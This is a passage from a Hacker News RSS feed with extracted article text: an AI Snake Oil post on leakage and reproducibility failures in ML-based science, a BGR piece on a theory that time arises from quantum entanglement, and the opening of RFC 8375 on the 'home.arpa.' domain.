standard.</p></section><div data-event-module="footer"><address id="article-writer-0" data-event-element="author" data-flatplan-bio="true"><div><p><a href="https://www.theatlantic.com/author/jonathan-lambert/" data-label="https://www.theatlantic.com/author/jonathan-lambert/" data-action="click author - name">Jonathan Lambert</a> is a journalist based in Washington, D.C., who covers the intersection of science, health, and policy. He holds a master’s degree in neurobiology and behavior from Cornell University. He has written for <em>Science News</em>, NPR, <em>Grid</em>, and <em>Quanta Magazine</em>.</p></div></address></div><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists should use AI as a tool, not an oracle (116 pts)]]></title>
            <link>https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool</link>
            <guid>40568026</guid>
            <pubDate>Mon, 03 Jun 2024 21:54:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool">https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool</a>, See on <a href="https://news.ycombinator.com/item?id=40568026">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><span>Who produces AI hype? As we discuss in the AI Snake Oil </span><a href="https://www.aisnakeoil.com/p/ai-snake-oil-is-now-available-to" rel="">book</a><span>, it is not just companies and the media but also AI researchers. For example, a pair of widely-publicized papers in Nature in December 2023 claimed to have </span><a href="https://www.nature.com/articles/s41586-023-06735-9" rel="">discovered</a><span> over 2.2 million new materials using AI, and robotically </span><a href="https://www.nature.com/articles/s41586-023-06734-w" rel="">synthesized</a><span> 41 of them. Unfortunately, the claims were </span><a href="https://chemrxiv.org/engage/chemrxiv/article-details/65957d349138d231611ad8f7" rel="">quickly</a><span> </span><a href="https://x.com/Robert_Palgrave/status/1744383965270581615" rel="">debunked</a><span>: “Most of the [41] materials produced were misidentified, and the rest were already known”. As for the large dataset, examining a sample of 250 compounds showed that it was </span><a href="https://pubs.acs.org/doi/10.1021/acs.chemmater.4c00643" rel="">mostly junk</a><span>.</span></p><p><span>A core selling point of machine learning is discovery without understanding, which is why errors are particularly common in machine-learning-based science. Three years ago, we </span><a href="https://reproducible.cs.princeton.edu/" rel="">compiled evidence</a><span> revealing that an error called leakage — the machine learning version of teaching to the test — was pervasive, affecting hundreds of papers from 17 disciplines. Since then, we have been trying to understand the problem better and devise solutions.&nbsp;</span></p><p>This post presents an update. In short, we think things will get worse before they get better, although there are glimmers of hope on the horizon.&nbsp;</p><p><strong>The carnage continues</strong></p><p><span>In our most recent compilation, the number of disciplines where researchers have </span><a href="https://reproducible.cs.princeton.edu/#rep-failures" rel="">uncovered leakage</a><span> in published work has reached 30. The majority are medical fields, which we strongly suspect is due to the fact that since errors in medical research can be particularly consequential, medical fields seem to put much more effort into establishing best practices and critically reviewing previously published work. About 650 papers across all fields are affected, which we hypothesize is a vast underestimate — when researchers look for leakage systematically, in many fields they find that the </span><em>majority</em><span> of sampled studies commit the error of leakage.</span></p><p><span>Leakage is one of many reasons for reproducibility failures. There are widespread </span><a href="https://reforms.cs.princeton.edu/appendix3.html" rel="">shortcomings</a><span> in every step of ML-based science, from data collection to preprocessing and reporting results. Problems that might lead to irreproducibility include improper comparisons to baselines, unrepresentative samples, results being sensitive to specific modeling choices, and not reporting model uncertainties. There is also the basic problem of researchers failing to publish their code and data, precluding reproducibility. For example, Gabelica et al. </span><a href="https://pubmed.ncbi.nlm.nih.gov/35654271/" rel="">examined</a><span> 333 open-access journals indexed on BioMed Central in January 2019 and found that out of the 1,800 papers that pledged to share data upon request, 93% did not do so.</span></p><p><strong>The roots run deep</strong></p><p><span>Even before ML, many scientific fields have been facing reproducibility and replicability crises. The root causes include the publish-or-perish culture in science, the strong bias for publishing positive results (and the near-impossibility of publishing negative results), the lack of incentives for debunking faulty studies, and the lack of consequences for publishing shoddy work. For example, faulty papers are almost never retracted. Peers don’t even seem to notice replication failures — after a paper fails to replicate, </span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10460510/" rel="">only 3%</a><span> of citing articles cited the replication attempt.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-1-145256582" target="_self" rel="">1</a></span><span> Science communicators love to claim that science self-corrects, but self-correction is practically nonexistent in our experience.</span></p><p>All of these cultural factors are also present in ML-based science. But ML introduces a bunch of additional reasons why we should be skeptical of published results. Performance evaluation is notoriously tricky and many aspects of it, such as uncertainty quantification, are unresolved research areas. Also, ML code tends to vastly more complex and less standardized than traditional statistical modeling. Since it is not peer reviewers’ job to review code, coding errors are rarely discovered.</p><p><span>But we think the biggest reason for the poor quality of research is pervasive hype, resulting in the lack of a skeptical mindset among researchers, which is a cornerstone of good scientific practice. We’ve observed that when researchers have overoptimistic expectations, and their ML model performs poorly, they assume that they did something wrong and tweak the model, when in fact they should strongly consider the possibility that they have run up against inherent </span><a href="https://msalganik.github.io/cos597E-soc555_f2020/" rel="">limits to predictability</a><span>. Conversely, they tend to be credulous when their model performs well, when in fact they should be on high alert for leakage or other flaws. And if the model performs better than expected, they assume that it has discovered patterns in the data that no human could have thought of, and the myth of AI as an alien intelligence makes this explanation seem readily plausible.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png" width="373" height="236.5787037037037" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:822,&quot;width&quot;:1296,&quot;resizeWidth&quot;:373,&quot;bytes&quot;:83688,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>This is a feedback loop. Overoptimism fuels flawed research which further misleads other researchers in the field about what they should and shouldn’t expect AI to be able to do. In fact, we’ve encountered extreme versions of this in private correspondence with frustrated researchers: since flawed research goes uncorrected, it becomes literally impossible to publish good research since it will result in models that don’t beat the “state of the art”.</p><p><span>The more powerful and more black-box the tool, the more the potential for errors and overconfidence. The replication crises in psychology, medicine, etc. were the result of misapplication of plain old statistics. Given how relatively new ML is, our guess is that the reproducibility crisis in ML-based science will get worse for a while before it starts to get better. And now scientists are embracing large language models and generative AI, which open up many new pitfalls such as the </span><a href="https://www.nature.com/articles/s41586-024-07146-0" rel="">illusion of understanding</a><span>.</span></p><p><strong>Glimmers of hope</strong></p><p>One good thing about ML-based science is that it usually involves only data analysis, not experimenting on people. So other researchers should in principle be able to download a paper’s code and data and check whether they can reproduce the reported results. They can also review the code for any errors or problematic choices. This is time consuming, but much less so than replicating a study in psychology or medicine, which is typically almost as costly as the original study.</p><p>Another good thing is that the vast majority of errors can be avoided if the researchers know what to look out for. In contrast, mitigations for the replication crisis in statistical science, such as pre-registration, have a much more spotty track record of effectiveness.</p><p><span>So we think that the problem can be greatly mitigated by a culture change where researchers systematically exercise more care in their work and reproducibility studies are incentivized. The ML </span><em>methods</em><span> community has already moved in this direction via the </span><a href="https://www.simonsfoundation.org/event/reproducible-research-and-the-common-task-method/" rel="">common task method</a><span> (which is decades old) and the </span><a href="https://arxiv.org/abs/2003.12206" rel="">reproducibility challenge</a><span> (which is more recent), but this has not yet happened in ML-based science, that is, in disciplines like medicine or psychology that use ML models to advance knowledge in their respective fields.</span></p><p><span>We have led a few efforts to change this. First, our leakage paper has had an impact. It has been used by researchers to clarify how they build models and document and demonstrate the </span><a href="https://sportrxiv.org/index.php/server/preprint/view/191/351" rel="">absence of leakage</a><span>. It has been used by researchers trying to find leakage in </span><a href="https://arxiv.org/pdf/2401.14497" rel="">published work</a><span>. It has also been used as a way to underscore the importance of studying leakage and coming up with </span><a href="https://www.nature.com/articles/s41559-023-02162-1" rel="">discipline-specific</a><span> </span><a href="https://www.sciencedirect.com/science/article/pii/S0928098723001926" rel="">guidelines</a><span>.</span></p><p><span>Beyond leakage, we led a group of 19 researchers across computer science, data science, social sciences, mathematics, and biomedical research to develop the </span><a href="https://reforms.cs.princeton.edu/" rel="">REFORMS</a><span> checklist for ML-based science. It is a 32-item checklist that can help researchers catch eight kinds of common pitfalls in ML-based science, of which leakage is only one. It was recently </span><a href="https://www.science.org/doi/epdf/10.1126/sciadv.adk3452" rel="">published</a><span> in Science Advances. Of course, checklists by themselves won’t help if there isn’t a culture change, but based on the reception so far, we are cautiously optimistic.</span></p><p><strong>Concluding thoughts</strong></p><p>Our point isn’t that AI is useless to scientists. We ourselves frequently use AI as a tool, even in our research that’s not about AI. The key word is tool. AI is not a revolution. It is not a replacement for human understanding — to think so is to miss the point of science. AI does not offer a shortcut to the hard work and frustration inherent to research. AI is not an oracle and cannot see the future.</p><p><span>Unfortunately, most scientific fields have succumbed to AI hype, leading to a suspension of common sense. For example, a line of research in political science claimed to predict the onset of civil war with an accuracy</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-2-145256582" target="_self" rel="">2</a></span><span> of well over 90%, a number that should sound facially impossible. (It </span><a href="https://reproducible.cs.princeton.edu/#civil-war" rel="">turned out</a><span> to be leakage, which is what got us interested in this whole line of research.)</span></p><p><span>We are at an interesting moment in the history of science. Look at these graphs showing the adoption of AI in various fields:</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-3-145256582" target="_self" rel="">3</a></span></p><p><span>These hockey stick graphs are not good news. They should be terrifying. Adopting AI requires changes to scientific epistemology.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-4-145256582" target="_self" rel="">4</a></span><span> No scientific field has the capacity to accomplish this on a timescale of a couple of years. This is not what happens when a tool or method is adopted organically. It happens when scientists jump on a trend to get funding. Given the level of hype, scientists don’t need </span><em>additional</em><span> incentives to adopt AI. That means AI-for-science funding programs are probably making things worse. We doubt the avalanche of flawed research can be stopped, but if at least a fraction of AI-for-science funding were diverted to better training, critical inquiry, meta-science, reproducibility, and other quality-control efforts, the havoc can be minimized.</span></p><p><span>Our book </span><em>AI Snake Oil</em><span> is now available to preorder. If you have enjoyed our blog and would like to support our work, please preorder via </span><a href="https://substack.com/redirect/f0945e82-44e2-4998-9535-cee6fe9f0fa5?j=eyJ1IjoiYmd4a3MifQ.EjRMsvQe8Xc2mF1xAwL5aBabUU37X2wfP2-gBTgHzJM" rel="">Amazon</a><span>, </span><a href="https://substack.com/redirect/fd84f1c5-276b-488f-b91b-3cc7f32821ba?j=eyJ1IjoiYmd4a3MifQ.EjRMsvQe8Xc2mF1xAwL5aBabUU37X2wfP2-gBTgHzJM" rel="">Bookshop</a><span>, or your favorite bookseller.</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New theory suggests time is an illusion created by quantum entanglement (141 pts)]]></title>
            <link>https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/</link>
            <guid>40567676</guid>
            <pubDate>Mon, 03 Jun 2024 21:19:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/">https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/</a>, See on <a href="https://news.ycombinator.com/item?id=40567676">Hacker News</a></p>
<div id="readability-page-1" class="page"><article data-url="https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/" data-title="New theory suggests time is an illusion created by quantum entanglement">

						
						

						<div>
							<div>
																	<p><a href="https://bgr.com/author/joshua-hawkins/"><img width="50" height="50" src="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82&amp;strip=all&amp;w=50" alt="" decoding="async" srcset="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82 250w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=150%2C150&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=100%2C100&amp;quality=82 100w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=42%2C42&amp;quality=82 42w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=96%2C96&amp;quality=82 96w" sizes="(max-width: 50px) 100vw, 50px"></a></p>
															</div>
															<div>
									
									<p><span>Published Jun 3rd, 2024 3:04PM EDT</span>
								</p></div>
													</div>

						
						
							<div>
								<p><img width="1020" height="574" src="https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?quality=82&amp;strip=all&amp;w=1020&amp;h=574&amp;crop=1" alt="quantum physics questions, universe" decoding="async" sizes="(min-width: 640px) 75vw, 100vw" fetchpriority="high" srcset="https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?quality=82 2400w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=150%2C84&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=300%2C169&amp;quality=82 300w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=768%2C432&amp;quality=82 768w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=1024%2C576&amp;quality=82 1024w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=1536%2C864&amp;quality=82 1536w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=2048%2C1152&amp;quality=82 2048w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=178%2C100&amp;quality=82 178w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=190%2C107&amp;quality=82 190w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=260%2C146&amp;quality=82 260w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=360%2C203&amp;quality=82 360w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=380%2C214&amp;quality=82 380w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=389%2C219&amp;quality=82 389w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=510%2C287&amp;quality=82 510w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=520%2C293&amp;quality=82 520w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=600%2C338&amp;quality=82 600w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=720%2C405&amp;quality=82 720w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=778%2C438&amp;quality=82 778w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=1020%2C574&amp;quality=82 1020w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=75%2C42&amp;quality=82 75w" title="definition of time">								</p>

								
																									<div>
																																<p><span>Image: Ulia Koltyrina / Adobe</span>
																			</p></div>
															</div>

						
						

												<div>

							<div>
								
<p>A new definition of time suggests that what we once thought was a fundamental element of our physical reality could actually just be an illusion created by quantum entanglement. That’s a very bold statement and one that certainly requires a little digging into to fully understand. So, let’s dig in.</p><p>To understand the core of this new theory, we need to understand a few things, including quantum entanglement. By its most basic definition, quantum entanglement is when two objects are so inextricably linked that when one is disturbed, the other is also disturbed, no matter how far apart they are. We also need to understand how time works in “general relativity.”

</p>
<p>General relativity says that time is baked into our universe, that our physical reality is set in space-time, and that time can warp and dilate in the presence of gravity; scientists believe we have seen <a href="https://bgr.com/science/our-galaxys-supermassive-black-hole-is-spinning-so-fast-its-warping-space-time/" target="_blank" rel="noreferrer noopener">the Milky Way’s black hole warp space-time</a> around it. However, quantum theory says that time isn’t bendable in any way. It does not change. Many physicists believe that the definition of time across both theories should be consistent. To prove this, Alessandro Coppo and other researchers went hunting for a new way to define time.

</p><figure><img decoding="async" loading="lazy" width="2400" height="1601" src="https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?quality=82&amp;strip=all" alt="old clock on pole" srcset="https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?quality=82 2400w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=150%2C100&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=300%2C200&amp;quality=82 300w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=768%2C512&amp;quality=82 768w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=1024%2C683&amp;quality=82 1024w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=1536%2C1025&amp;quality=82 1536w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=2048%2C1366&amp;quality=82 2048w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=63%2C42&amp;quality=82 63w" sizes="(max-width: 2400px) 100vw, 2400px"><span><span>Image source: Александр Бочкала / Adobe</span></span></figure><p>The suggestion here, at its core, seems to point to time being purely a consequence of entanglement. It states that the only reason that an object appears to change over time is because it is entangled with a clock. As such, anyone observing the universe externally would see it as completely static and unchanging.</p><div>	<h4>Tech. Entertainment. Science. Your inbox.</h4>	<p>Sign up for the most interesting tech &amp; entertainment news out there.</p>		<p>By signing up, I agree to the <a rel="noopener" href="https://pmc.com/terms-of-use/" target="_blank">Terms of Use</a> and have reviewed the <a rel="noopener" href="https://pmc.com/privacy-policy/" target="_blank">Privacy Notice.</a></p>	</div><p>It’s certainly an interesting new way to try to define time. While many physicists believe that the new definition of time is promising, there are still some details that need to be ironed out to really fully understand exactly what time is and whether or not it is truly a consequence of quantum entanglement. There’s also the matter of whether or not we can even test any of these ideas.</p><p>The researchers <a href="https://journals.aps.org/pra/abstract/10.1103/PhysRevA.109.052212" target="_blank" rel="noreferrer noopener">published their findings</a> in a paper featured in <em>Physical Review A</em>.</p>
							</div>

															<div>
	<h3>This article talks about:</h3>
					<p><span>
			<a href="https://bgr.com/tag/time/" rel="tag">
				TIME			</a>
		</span>
	</p></div>

								

								
<div>
		
		<div>
			<p><a href="https://bgr.com/author/joshua-hawkins/"><img width="56" height="56" src="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82&amp;strip=all&amp;w=56" alt="" decoding="async" srcset="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82 250w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=150%2C150&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=100%2C100&amp;quality=82 100w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=42%2C42&amp;quality=82 42w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=96%2C96&amp;quality=82 96w" sizes="(max-width: 56px) 100vw, 56px"></a></p>
		</div>

		<div>
			<p>Josh Hawkins has been writing for over a decade, covering science, gaming, and tech culture. He also is a top-rated product reviewer with experience in extensively researched product comparisons, headphones, and gaming devices.</p>
<p>Whenever he isn’t busy writing about tech or gadgets, he can usually be found enjoying a new world in a video game, or tinkering with something on his computer.</p>
		</div>

					
		
					
		
	</div>
													</div>

													
						
					</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Special-use domain 'home.arpa.' (2018) (110 pts)]]></title>
            <link>https://datatracker.ietf.org/doc/html/rfc8375</link>
            <guid>40567580</guid>
            <pubDate>Mon, 03 Jun 2024 21:07:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://datatracker.ietf.org/doc/html/rfc8375">https://datatracker.ietf.org/doc/html/rfc8375</a>, See on <a href="https://news.ycombinator.com/item?id=40567580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><pre>Internet Engineering Task Force (IETF)                        P. Pfister
Request for Comments: 8375                                 Cisco Systems
Updates: <a href="https://datatracker.ietf.org/doc/html/rfc7788">7788</a>                                                   T. Lemon
Category: Standards Track                            Nibbhaya Consulting
ISSN: 2070-1721                                                 May 2018


                    <span>Special-Use Domain 'home.arpa.'</span>

Abstract

   This document specifies the behavior that is expected from the Domain
   Name System with regard to DNS queries for names ending with
   '.home.arpa.' and designates this domain as a special-use domain
   name. 'home.arpa.' is designated for non-unique use in residential
   home networks.  The Home Networking Control Protocol (HNCP) is
   updated to use the 'home.arpa.' domain instead of '.home'.

Status of This Memo

   This is an Internet Standards Track document.

   This document is a product of the Internet Engineering Task Force
   (IETF).  It represents the consensus of the IETF community.  It has
   received public review and has been approved for publication by the
   Internet Engineering Steering Group (IESG).  Further information on
   Internet Standards is available in <a href="https://datatracker.ietf.org/doc/html/rfc7841#section-2">Section&nbsp;2 of RFC 7841</a>.

   Information about the current status of this document, any errata,
   and how to provide feedback on it may be obtained at
   <a href="https://www.rfc-editor.org/info/rfc8375">https://www.rfc-editor.org/info/rfc8375</a>.

Copyright Notice

   Copyright (c) 2018 IETF Trust and the persons identified as the
   document authors.  All rights reserved.

   This document is subject to <a href="https://datatracker.ietf.org/doc/html/bcp78">BCP 78</a> and the IETF Trust's Legal
   Provisions Relating to IETF Documents
   (<a href="https://trustee.ietf.org/license-info">https://trustee.ietf.org/license-info</a>) in effect on the date of
   publication of this document.  Please review these documents
   carefully, as they describe your rights and restrictions with respect
   to this document.  Code Components extracted from this document must
   include Simplified BSD License text as described in Section 4.e of
   the Trust Legal Provisions and are provided without warranty as
   described in the Simplified BSD License.





<span>Pfister &amp; Lemon              Standards Track                    [Page 1]</span></pre>
<hr><!--NewPage--><pre><span id="page-2"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


Table of Contents

   <a href="#section-1">1</a>.  Introduction  . . . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-3">3</a>
   <a href="#section-2">2</a>.  Requirements Language . . . . . . . . . . . . . . . . . . . .   <a href="#page-4">4</a>
   <a href="#section-3">3</a>.  General Guidance  . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-4">4</a>
   <a href="#section-4">4</a>.  Domain Name Reservation Considerations  . . . . . . . . . . .   <a href="#page-4">4</a>
   <a href="#section-5">5</a>.  Updates to Home Networking Control Protocol . . . . . . . . .   <a href="#page-7">7</a>
   <a href="#section-6">6</a>.  Security Considerations . . . . . . . . . . . . . . . . . . .   <a href="#page-7">7</a>
     <a href="#section-6.1">6.1</a>.  Local Significance  . . . . . . . . . . . . . . . . . . .   <a href="#page-7">7</a>
     <a href="#section-6.2">6.2</a>.  Insecure Delegation . . . . . . . . . . . . . . . . . . .   <a href="#page-8">8</a>
     <a href="#section-6.3">6.3</a>.  Bypassing Manually Configured Resolvers . . . . . . . . .   <a href="#page-9">9</a>
   <a href="#section-7">7</a>.  Delegation of 'home.arpa.'  . . . . . . . . . . . . . . . . .   <a href="#page-9">9</a>
   <a href="#section-8">8</a>.  IANA Considerations . . . . . . . . . . . . . . . . . . . . .   <a href="#page-9">9</a>
   <a href="#section-9">9</a>.  References  . . . . . . . . . . . . . . . . . . . . . . . . .  <a href="#page-10">10</a>
     <a href="#section-9.1">9.1</a>.  Normative References  . . . . . . . . . . . . . . . . . .  <a href="#page-10">10</a>
     <a href="#section-9.2">9.2</a>.  Informative References  . . . . . . . . . . . . . . . . .  <a href="#page-10">10</a>
   Acknowledgments . . . . . . . . . . . . . . . . . . . . . . . . .  <a href="#page-12">12</a>
   Authors' Addresses  . . . . . . . . . . . . . . . . . . . . . . .  <a href="#page-12">12</a>

































<span>Pfister &amp; Lemon              Standards Track                    [Page 2]</span></pre>
<hr><!--NewPage--><pre><span id="page-3"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


<span><a id="section-1" href="#section-1">1</a>.  Introduction</span>

   Users and devices within a home network (hereafter referred to as
   "homenet") require devices and services to be identified by names
   that are unique within the boundaries of the homenet [<a href="https://datatracker.ietf.org/doc/html/rfc7368" title="&quot;IPv6 Home Networking Architecture Principles&quot;">RFC7368</a>].  The
   naming mechanism needs to function without configuration from the
   user.  While it may be possible for a name to be delegated by an ISP,
   homenets must also function in the absence of such a delegation.
   This document reserves the name 'home.arpa.' to serve as the default
   name for this purpose, with a scope limited to each individual
   homenet.

   This document corrects an error in [<a href="https://datatracker.ietf.org/doc/html/rfc7788" title="&quot;Home Networking Control Protocol&quot;">RFC7788</a>] by replacing '.home'
   with 'home.arpa.' as the default domain name for homenets. '.home'
   was selected as the most user-friendly option; however, there are
   existing uses of '.home' that may be in conflict with this use.
   Evidence indicates that '.home' queries frequently leak out and reach
   the root name servers [<a href="#ref-ICANN1" title="&quot;New gTLD Collision Risk Mitigation&quot;">ICANN1</a>] [<a href="#ref-ICANN2" title="&quot;New gTLD Collision Occurence Management&quot;">ICANN2</a>].

   In addition, for compatibility with DNSSEC (see <a href="#section-6">Section 6</a>), it's
   necessary that an insecure delegation (see <a href="https://datatracker.ietf.org/doc/html/rfc4035#section-4.3">Section&nbsp;4.3 of [RFC4035]</a>)
   be present for the name.  There is an existing process for allocating
   names under '.arpa.'  [<a href="https://datatracker.ietf.org/doc/html/rfc3172" title="&quot;Management Guidelines &amp; Operational Requirements for the Address and Routing Parameter Area Domain (&quot;">RFC3172</a>].  No such process is available for
   requesting a similar delegation in the root at the request of the
   IETF, which does not administer that zone.  As a result, all
   unregistered uses of '.home' (that is, all current uses at the time
   of this document's publication), particularly as specified in
   [<a href="https://datatracker.ietf.org/doc/html/rfc7788" title="&quot;Home Networking Control Protocol&quot;">RFC7788</a>], are deprecated.

   This document registers the domain 'home.arpa.' as a special-use
   domain name [<a href="https://datatracker.ietf.org/doc/html/rfc6761" title="&quot;Special-Use Domain Names&quot;">RFC6761</a>] and specifies the behavior that is expected
   from the Domain Name System with regard to DNS queries for names
   whose rightmost non-terminal labels are 'home.arpa.'.  Queries for
   names ending with '.home.arpa.' are of local significance within the
   scope of a homenet, meaning that identical queries will result in
   different results from one homenet to another.  In other words, a
   name ending in '.home.arpa.' is not globally unique.

